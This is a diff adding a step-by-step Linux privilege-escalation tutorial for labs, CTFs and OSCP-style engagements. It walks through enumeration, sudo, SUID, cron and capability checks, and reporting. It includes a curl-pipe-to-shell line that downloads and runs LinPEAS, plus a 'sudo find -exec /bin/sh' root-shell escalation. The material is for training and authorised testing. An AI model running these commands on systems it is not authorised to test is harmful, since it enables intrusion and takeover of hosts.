@@ -1,0 +1,86 @@
+Step 1 — Initial foothold and situational awareness
+
+Once you’ve landed a shell (from the SSH brute force in your lab, or a web shell on a vuln box):
+
+bash
+whoami && id
+hostname
+uname -a
+cat /etc/os-release
+
+Confirm what you are and what you’re working with before touching anything else.
+
+Step 2 — Automated enumeration
+
+Run the standard enumeration scripts to get a baseline fast, then manually verify anything interesting:
+
+bash
+# LinPEAS - the most common starting point
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# or if you can't pull from the internet
+./linpeas.sh > linpeas_output.txt
+
+LinPEAS flags things in color (red/yellow) — those are your priority leads, not a guarantee of a win.
+
+Step 3 — Manual enumeration checklist
+
+This is the part that actually teaches you something, since LinPEAS can miss context:
+
+Sudo permissions
+
+bash
+sudo -l
+
+Look for binaries you can run as root with no password. Then check GTFOBins for that binary — most common shell/text-editing tools (vim, find, less, awk, python) have a documented sudo escalation.
+
+SUID/SGID binaries
+
+bash
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
+
+Again, cross-reference each unusual one against GTFOBins.
+
+Cron jobs
+
+bash
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+
+Look for scripts owned by root but writable by your user, or scripts referencing binaries without a full path (PATH hijack opportunity).
+
+Writable files/world-writable directories
+
+bash
+find / -writable -type d 2>/dev/null
+find / -perm -o+w -type f 2>/dev/null
+
+Capabilities
+
+bash
+getcap -r / 2>/dev/null
+
+A binary with cap_setuid+ep is effectively a root shell, same idea as SUID but less commonly checked.
+
+Kernel/version exploits
+
+bash
+uname -r
+searchsploit "Linux Kernel $(uname -r)"
+
+Last resort in a real engagement (riskier, can crash the box) but a common CTF path — THM’s “Linux PrivEsc” and the OffSec PWK material both cover DirtyCow-style and polkit/pkexec-style examples here.
+
+Step 4 — Exploit and confirm
+
+Once you’ve picked a vector — say a sudo misconfig on find:
+
+bash
+sudo find . -exec /bin/sh \; -quit
+
+Confirm with id that you’re root, then document exactly which vector worked and why (this is the part people skip and it’s the part that actually matters for OSCP reporting and real engagements).
+
+Step 5 — Post-escalation cleanup and reporting
+
+For a real engagement: establish persistence only if scoped to do so, capture proof (screenshot of id + flag/file read), and fully document the path from initial foothold to root — that chain is the actual deliverable, not the root shell itself.
